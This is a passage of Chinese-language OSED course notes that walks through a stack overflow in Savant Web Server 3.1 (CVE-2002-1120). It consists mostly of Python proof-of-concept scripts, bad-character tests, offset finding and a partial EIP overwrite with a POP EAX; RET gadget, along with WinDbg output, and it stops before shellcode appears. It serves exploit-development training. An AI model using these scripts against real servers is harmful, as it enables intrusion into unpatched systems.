---
title: "[OSED, EXP-301] Instructional notes - Part 3"
date: 2026-11-10
author: "CHW"
tags:
  - offsec
description: "OSED EXP-301 筆記 Part 3，聚焦空間受限環境下的 Egghunter 漏洞利用，以 Savant Web Server 3.1（CVE-2002-1120）為例，涵蓋 crash 分析與 Bad Characters 偵測、Partial EIP Overwrite、以 POP EAX; RET 與 Conditional Jump 將執行流程導回並改寫 HTTP Method、Windows Heap Memory Manager 與第二階段 Buffer 配置、使用 Keystone Engine 組譯 Egghunter、透過 NtAccessCheckAndAuditAlarm System Call 掃描記憶體並修正 Windows 10 System Call Number 與 Null Byte 問題、msfvenom Meterpreter payload 取得 Shell，以及改用 SEH-based Egghunter 提升跨版本可攜性等等。"
---

[OSED, EXP-301] Instructional notes - Part 3
===

# Table of Contents
[TOC]

# [Link back to: "[OSED, EXP-301] Instructional notes - Part 1"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-1/)
# [Link back to: "[OSED, EXP-301] Instructional notes - Part 2"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-2/)
>[!Caution]
> 接續 [[OSED, EXP-301] Instructional notes - Part 2](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-2/) 內容

# Overcoming Space Restrictions: Egghunters
[Savant](http://savant.sourceforge.net/) [Web Server version 3.1](https://www.exploit-db.com/exploits/18401) 案例會遇到了一個問題 ([vulnerability](https://www.exploit-db.com/exploits/38079))：\
雖然可以覆寫 EIP，但 ESP 指向的位置只有約 3 bytes 可以利用，根本放不下完整的 Shellcode\
逐步分析如何面對這種空間限制，以及如何利用記憶體中其他位置存放的 Payload

Exploit:\
![image](https://hackmd.io/_uploads/SJCaZBk6zl.png)\
![image](https://hackmd.io/_uploads/rJ80ZBy6zg.png)

## Crashing the Savant Web Server
環境範例已安裝好 Savant Web Server version 3.1
![image](https://hackmd.io/_uploads/rkzEJSy6fe.png)

[CVE-2002-1120](https://www.cvedetails.com/cve/CVE-2002-1120/) Public PoC code:
```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 80
  size = 260

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")

```
> 產生 260 bytes 的測試資料 (260 個 A)

WinDbg attach 到 Savant.exe process\
抓到 Access Violation

![image](https://hackmd.io/_uploads/ryeDLSy6ze.png)
```dbg
(1040.1b84): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
eax=ffffffff ebx=01805718 ecx=6f2d6175 edx=00000000 esi=01805718 edi=0041703c
eip=41414141 esp=01b8ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
```
![image](https://hackmd.io/_uploads/HksSIHy6fl.png)


## Analyzing the Crash in WinDbg
環境範例中雖然 ESP 指向我們控制的 Buffer，但只有 3 bytes 可用於放置 Shellcode\
💡 能控制執行流程，不代表能在執行流程所指向的位置放入足夠的程式碼

使用 `dds @esp L5` 檢查 Stack，從 ESP 指向的位置開始，顯示後面 5 個 DWORD\
(在 32-bit x86 環境中 1 DWORD = 4 bytes，dds 適合用來檢查 Stack 上的 32-bit 數值)
```dbg
0:004> dds @esp L5
01b8ea2c  00414141 Savant+0x14141
01b8ea30  01b8ea84
01b8ea34  0041703c Savant+0x1703c
01b8ea38  01805718
01b8ea3c  01805718
```
>- `01b8ea2c`: DWORD 儲存在記憶體中的位址
>- `00414141`: 該位址儲存的數值
>- `Savant+0x14141`: WinDbg 嘗試將該數值解析成 Savant 模組中的位址後顯示的符號資訊

>[!Tip]
>空間有限的情況，應該先嘗試增加發送的 buffer 的大小，以確定這是否會為 overflow 提供更多空間

```dbg
(1670.1694): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Savant\Savant.exe
eax=41414141 ebx=016456d0 ecx=81914a60 edx=00000001 esi=016456d0 edi=0041703c
eip=0040c05f esp=02fee6b8 ebp=02feea24 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
Savant+0xc05f:
0040c05f 8b08            mov     ecx,dword ptr [eax]  ds:0023:41414141=????????
```
> 第一次的 EIP 是 0x41414141，第二次的 EIP 則是 0x0040C05F\
> ‼️ 增加 Byte 就造成另一種 Crash\
> 增加 Buffer Size 會導致不同的 Crash，不能直接認為增加輸入長度就能解決空間不足的問題

![image](https://hackmd.io/_uploads/SJdKc-v6zg.png)

檢查 Stack 上是否有 Buffer Pointer，既然 Register 沒有直接指向 Buffer，接下來就要檢查 Stack\
檢查 ESP 後面的兩個 DWORD
```dbg
0:004> dds @esp L2
01b8ea2c  00414141 Savant+0x14141
01b8ea30  01b8ea84

0:004> dc poi(esp+4)
01b8ea84  00544547 00000000 00000000 00000000  GET.............
01b8ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
01b8eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
01b8eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
01b8eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
01b8ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
01b8eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
01b8eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
> `01b8ea84` 看起來是一個有效的 Stack Address
> 利用 `poi()` 讀取指定記憶體位置所保存的 DWORD 值，尋找 ESP+4\
> 發現多個 Null Byte (`00000000`)
>> 除了 Buffer 空間很小之外，這段資料還有 Null Byte 終止的特性

## Detecting Bad Characters
建立完整的 Bad Characters 測試資料，，加入所有可能的 Hexadecimal Byte
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 260

  badchars = (
    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  httpMethod = b"GET /"
  inputBuffer = badchars
  inputBuffer+= b"\x41" * (size - len(inputBuffer))
  httpEndRequest = b"\r\n\r\n"
...
```
長度維持 260 Bytes，上節已確認這個長度可以觸發 EIP Overwrite\
現在只測試 Byte 是否會被破壞

(Savant 沒有 Crash)

二分法縮小 Bad Character 範圍 (只測試後半段)
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 260

  badchars = (
    #b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    #b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    #b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    #b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    #b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    #b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    #b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    #b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    #b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    #b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

  httpMethod = b"GET /"
  inputBuffer = badchars
  inputBuffer+= b"\x41" * (size - len(inputBuffer))
  httpEndRequest = b"\r\n\r\n"
...
```
Windbg:
```dbg
(1dac.1b98): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
eax=ffffffff ebx=019d57b0 ecx=b4797e20 edx=00000000 esi=019d57b0 edi=0041703c
eip=41414141 esp=01bdea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
```
> `EIP = 41414141`: 成功控制 EIP

使用 WinDbg 確認字元在記憶體中沒有被損壞，以 Byte 為單位顯示記憶體\
(初步判斷檢查 `0x82` ~ `0xFF`)
```dbg
0:005> db esp - 0n257
01bde92b  82 83 84 85 86 87 88 89-8a 8b 8c 8d 8e 8f 90 91  ................
01bde93b  92 93 94 95 96 97 98 99-9a 9b 9c 9d 9e 9f a0 a1  ................
01bde94b  a2 a3 a4 a5 a6 a7 a8 a9-aa ab ac ad ae af b0 b1  ................
01bde95b  b2 b3 b4 b5 b6 b7 b8 b9-ba bb bc bd be bf c0 c1  ................
01bde96b  c2 c3 c4 c5 c6 c7 c8 c9-ca cb cc cd ce cf d0 d1  ................
01bde97b  d2 d3 d4 d5 d6 d7 d8 d9-da db dc dd de df e0 e1  ................
01bde98b  e2 e3 e4 e5 e6 e7 e8 e9-ea eb ec ed ee ef f0 f1  ................
01bde99b  f2 f3 f4 f5 f6 f7 f8 f9-fa fb fc fd fe ff 41 41  ..............AA
```
> - `0n257`: 0n 代表十進位數字\
> 從 ESP 往前 257 Bytes 的位置開始，以 Byte 為單位顯示記憶體
>> 目前檢查到的這一段 Byte，沒有被修改。最後顯示的 41 41 只是這一行輸出的最後兩個 Byte，完整的 Buffer 可能還有剩餘的 A

已知 `0x82 ~ 0xFF` 沒有發現問題，接著測試 `0x00 ~ 0x81`\
反覆測試、縮小範圍，再逐個確認

Savant Web Server 的 Bad Characters 結果\
確認出四個 Bad Characters：`0x00`, `0x0A`, `0x0D`, `0x25`\
![image](https://hackmd.io/_uploads/Sy6717vaMl.png)

## Gaining Code Execution
先找 EIP Offset，使用 `msf-pattern_create` 產生 Unique Pattern
```python
...
try:
  server = sys.argv[1]
  port = 80

  httpMethod = b"GET /"
  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"
  httpEndRequest = b"\r\n\r\n"
...
```
Windbg:
```dbg
(b94.d94): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
eax=00694135 ebx=001a5778 ecx=0cfdd18b edx=00000001 esi=001a5778 edi=0041703c
eip=0040c05f esp=03dfe6b8 ebp=03dfea24 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
Savant+0xc05f:
0040c05f 8b08            mov     ecx,dword ptr [eax]  ds:0023:00694135=????????
```
>`EIP = 0040c05f` ??!\
>不是預期的 Pattern 值。代表與前面增加 Buffer Size 的情況類似：\
>**CPU 在 Savant.exe 的內部程式碼位置發生了 Access Violation**
>👉🏻 將 Buffer 分成兩段，透過不同字元確認 EIP 落在哪一段，可以先確認 Offset 大致位置

改用 A、B 分段找 Offset:
```python
...
try:
  server = sys.argv[1]
  port = 80

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * 130
  inputBuffer+= b"\x42" * 130
  httpEndRequest = b"\r\n\r\n"
...
```
Windbg:
```dbg
(1378.10b0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
eax=ffffffff ebx=01925778 ecx=3373eeb6 edx=00000000 esi=01925778 edi=0041703c
eip=42424242 esp=03efea2c ebp=42424242 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
42424242 ??              ???
```
代表 EIP 被後半段的 B 覆寫\
得知：EIP 的 Offset 位於這 130 個 B 的區域。但還不能確定精確位置

繼續縮小範圍，找出精確 Offset: Ex. 130 A + 65 B + 65 C

最後得到 253 Bytes\
Offset = 253, EIP Size = 4 Bytes

使用 A、B、C 驗證 Offset = 253
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 260

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * 253
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
  httpEndRequest = b"\r\n\r\n"
...
```
Windbg:
```dbg
(13a0.b24): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Savant\Savant.exe
eax=ffffffff ebx=015656d0 ecx=95b16e78 edx=00000000 esi=015656d0 edi=0041703c
eip=42424242 esp=0309ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
42424242 ??              ???
```
最終 Buffer Layout:
```
Offset 0
    │
    ▼
┌───────────────────────┐
│ 253 Bytes of A        │
├───────────────────────┤
│ 4 Bytes of B          │ ← EIP
├───────────────────────┤
│ 3 Bytes of C          │
└───────────────────────┘
```


接著用 narly (WinDbg Extension) 協助列出目前 Process 載入的 Module，以及安全防護資訊
```dbg
0:008> .load narly
...

0:008> !nmod
00400000 00452000 Savant               /SafeSEH OFF                C:\Savant\Savant.exe
687a0000 689a9000 comctl32_687a0000    /SafeSEH ON  /GS *ASLR *DEP C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.10240.17184_none_3bcab1476bcee5ec\comctl32.DLL
6ad00000 6ad0b000 winrnr               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\winrnr.dll
6ad10000 6ad26000 pnrpnsp              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\pnrpnsp.dll
6ad50000 6ad62000 napinsp              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\napinsp.dll
...
```
> `Savant /SafeSEH OFF C:\Savant\Savant.exe`
> 優先選應用程式本身附帶的 Module

### Partial EIP Overwrite
進一步利用 POP EAX; RET，讓執行流程回到 HTTP request 的資料區，再想辦法跳過 HTTP Method，進入我們真正控制的 0x41 buffer

經過上述測試已知 Offset 253
```dbg
(1738.a78): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Savant\Savant.exe
eax=ffffffff ebx=003d5750 ecx=731f61bf edx=00000000 esi=003d5750 edi=0041703c
eip=42424242 esp=02fcea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
42424242 ??              ???

0:003> dds @esp L4
02fcea2c  00434343 Savant+0x34343
02fcea30  02fcea84
02fcea34  0041703c Savant+0x1703c
02fcea38  003d5750
```
在 crush 時，buffer 以空字元結尾\
👉🏻 提供了一個使用部分 EIP overwrite 的機會。由於 Savant 可執行檔對應到以 null byte 開頭的位址範圍，可以將字串 null terminator 當作 EIP 覆蓋的一部分

更新 PoC 覆蓋 EIP 暫存器的 lower three bytes
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  inputBuffer+= b"\x42\x42\x42"
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```
> `inputBuffer += b"\x42\x42\x42"` 現在只放入三個 0x42 (第 4 個 byte 會由 Null terminator 補上)

Windbg:
```dbg
(5dc.14b8): Break instruction exception - code 80000003 (first chance)
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Savant\Savant.exe
eax=00000000 ebx=003d56d0 ecx=0000000e edx=77eb4550 esi=003d56d0 edi=0041703c
eip=00424242 esp=02efea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x24242:
00424242 cc              int     3
```
> - `eip`=00424242
> - `esp`=02efea2c
> - `ebp`=41414141
>
>EIP = 00424242 證明成功覆寫了 EIP 的低三個 bytes
>```
>原本完整的 EIP：
>00 00 00 00
>
>覆寫後：
>00 42 42 42
>```

>[!Note]
>**不能直接使用 JMP ESP ?!!**\
>現在已經可以把 EIP 導向 Savant.exe 裡面的指令\
>🥚 副作用 Null terminator 會在我們控制的資料後面終止字串\
>因此，不能再像一般 Stack Overflow 一樣，把 shellcode 放在 return address 後面，再使用 `JMP ESP` 

Stack 上第二個 DWORD 指向的位址，會指向 HTTP Method 和後面的輸入資料:
```dbg
0:003> dds @esp L5
02efea2c  02effe70
02efea30  02efea84
02efea34  0041703c Savant+0x1703c
02efea38  003d56d0
02efea3c  003d56d0

0:003> dc poi(@esp+0x04)
02efea84  00544547 00000000 00000000 00000000  GET.............
02efea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
02efeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
> - `@esp`：目前 ESP 的值
> - `@esp+0x04`：ESP 往後 4 bytes，也就是第二個 DWORD 的位置
> - `poi(...)`：讀取該位置存放的 DWORD，並把它當成記憶體位址
> - `dc`：以 DWORD 和 ASCII 的方式顯示該位址的記憶體內容

>[!Important]
>利用 POP R32; RET\
>R32 代表任意一個 32-bit register，Ex.EAX, EBX, ECX, EDX, ESI, EDI

假設目前 Stack 是：
```
ESP -> 02effe70
       02efea84
       0041703c
       003d56d0
```
執行：`POP EAX` 會發生：
1. 把 ESP 指向的第一個 `DWORD 02effe70` 放進 EAX
2. ESP 增加 4 bytes
3. ESP 現在指向原本的第二個 `DWORD 02efea84`

執行後：
```
EAX = 02effe70

ESP -> 02efea84
       0041703c
       003d56d0
```
接著執行：`RET`\
RET 會把 ESP 指向的 DWORD 當成新的 EIP：`EIP = 02efea84`\
因此執行流程就回到 HTTP Method 的開頭

![image](https://hackmd.io/_uploads/HyCQ_dOTzl.png)

⚠️ 不需要讓 ESP 直接指向 shellcode，利用 Stack 上第二個 DWORD，透過 `POP; RET` 間接回到 HTTP request buffer

```dbg
0:003> u poi(@esp+0x04)
02efea84 47              inc     edi
02efea85 45              inc     ebp
02efea86 54              push    esp
02efea87 0000            add     byte ptr [eax],al
02efea89 0000            add     byte ptr [eax],al
02efea8b 0000            add     byte ptr [eax],al
02efea8d 0000            add     byte ptr [eax],al
02efea8f 0000            add     byte ptr [eax],al
```

確認第一個 DWORD 被 POP 到哪個 register，`!teb` 查看 Thread Environment Block
```dbg
0:003> dds @esp L5
02efea2c  02effe70
02efea30  02efea84
02efea34  0041703c Savant+0x1703c
02efea38  003d56d0
02efea3c  003d56d0

0:003> !teb
TEB at 7ffdc000
    ExceptionList:        02efff70
    StackBase:            02f00000
    StackLimit:           02efc000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 7ffdc000
    EnvironmentPointer:   00000000
    ClientId:             000005dc . 000014b8
    RpcHandle:            00000000
    Tls Storage:          0028f508
    PEB Address:          7ffdb000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
```
> - `StackLimit` = 02efc000
> - `StackBase` = 02f00000

接著利用 `POP EAX` `RET` 讓第一個 DWORD 被放進 EAX\
(透過 msf-nasm_shell 取得 Opcode)
```
┌──(chw💲CHW)-[~]
└─$  msf-nasm_shell                      
nasm > pop eax
00000000  58                pop eax

nasm > ret
00000000  C3                ret
```
> - `pop eax`: 58
> - `ret`: C3

已知 Opcode 可以利用 Windbg 在 Savant.exe 搜尋
```dbg
0:003> lm m Savant
Browse full module list
start    end        module name
00400000 00452000   Savant   C (no symbols)

0:004> s -[1]b 00400000 00452000 58 c3
0x00418674
0x0041924f
0x004194f6
0x00419613
0x0041a531
0x0041af7f
...
```
> `0x00418674` 仍然有 Null byte，但現在已知如何利用 Partial EIP Overwrite，因此可以使用這個位址

更新 PoC:
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```
> - `<`：Little-endian
> - `L`：32-bit unsigned long
> - `0x418674`：要寫入的位址

Windbg 設定 Breakpoint
```dbg
0:008> bp 0x00418674
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Savant\Savant.exe

0:003> bl
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674
     
0:008> g
Breakpoint 0 hit
eax=00000000 ebx=015d5750 ecx=0000000e edx=77d94550 esi=015d5750 edi=0041703c
eip=00418674 esp=0305ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax
```
> `00418674 58  pop eax` 代表成功命中指令

`t` 單步執行返回資料
```dbg
0:003> t
eax=0305fe70 ebx=015d5750 ecx=0000000e edx=77d94550 esi=015d5750 edi=0041703c
eip=00418675 esp=0305ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18675:
00418675 c3              ret

0:003> t
eax=0305fe70 ebx=015d5750 ecx=0000000e edx=77d94550 esi=015d5750 edi=0041703c
eip=0305ea84 esp=0305ea34 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
0305ea84 47              inc     edi

0:003> u @eip
0305ea84 47              inc     edi
0305ea85 45              inc     ebp
0305ea86 54              push    esp
0305ea87 0000            add     byte ptr [eax],al
0305ea89 0000            add     byte ptr [eax],al
0305ea8b 0000            add     byte ptr [eax],al
0305ea8d 0000            add     byte ptr [eax],al
0305ea8f 0000            add     byte ptr [eax],al

0:003> dc @eip
0305ea84  00544547 00000000 00000000 00000000  GET.............
0305ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0305eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
> - `t`: 確認 EAX = 0305fe70 且 ESP 也增加了 4 bytes
> - `t`: 執行 RET，`EIP = 0305ea84` HTTP Method 的記憶體位址
> - `u @eip`: 確實開始執行 HTTP Method 的 bytes

```
Buffer Overflow
    ↓
Partial EIP Overwrite
    ↓
EIP = 00418674
    ↓
POP EAX
    ↓
RET
    ↓
EIP = HTTP Method 起始位置
    ↓
執行 GET 對應的 Assembly Instructions
```
BUT... 必須先執行 HTTP Method 的指令，才能抵達真正的 0x41 buffer

### Changing the HTTP Method
上述使用 `POP EAX` `RET` 把 EIP 導向 HTTP Method 的開頭\
🎯 解決執行一堆不必要的指令後，才能到真正的 buffer\
直接把 HTTP Method 替換成 Assembly Opcodes，讓程式從 HTTP Method 開頭就執行設計的指令

重新執行 PoC:\
`dc poi(@esp)` 讀取 ESP 指向的 DWORD，取得 RET 即將跳轉的位址
```dbg
...
eax=0305fe70 ebx=00195750 ecx=0000000e edx=77d94550 esi=00195750 edi=0041703c
eip=00418675 esp=0305ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18675:
00418675 c3              ret

0:003> dc poi(@esp)
0305ea84  00544547 00000000 00000000 00000000  GET.............
0305ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0305eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0305eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
> 可以理解成：
> ```
> HTTP Method 的記憶體配置：
>
>[GET][00][00][00][00][00][00][00][00][...][ /AAAA...]
> ```
> 1. HTTP Method 使用獨立的固定大小記憶體配置。
> 2. 配置的空間比實際 HTTP Method 長度大很多

🧠： 若 HTTP Method buffer 沒有嚴格檢查內容，可以將原本的 GET 替換成 Opcode

先確認可以修改 HTTP Method，把 HTTP Method 改成一連串 0x43 (`C`)
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x43\x43\x43\x43\x43\x43\x43\x43" + b" /"
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```
re-attach WinDbg，設定 Breakpoint
```dbg
0:008> bp 0x00418674
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Savant\Savant.exe

0:008> bl
